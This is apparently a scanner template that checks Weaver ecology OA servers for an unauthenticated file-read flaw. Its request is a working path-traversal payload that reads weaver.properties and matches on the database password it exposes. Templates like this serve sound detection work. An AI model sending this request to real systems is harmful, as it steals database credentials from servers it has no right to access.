id: ecology-info-leak
name: Ecology - Information Exposure
severity: high
confidence: confirmed
description: The "ecology" component exposes a file that contains sensitive database credentials (dbuser/dbpass).
reference: https://github.com/xinyisleep/pocscan/blob/main/%E6%B3%9B%E5%BE%AE/oa%E6%B3%9B%E5%BE%AE0day%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.py
tags:
- ecology
- unauth
- misconfig
- vuln
requests:
- method: GET
  path: /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties
  matchers:
  - type: body
    words:
    - ecology.password
    - ecology.charset
  - type: header
    words:
    - text/plain
  - type: status
    status:
    - 200
  condition: and
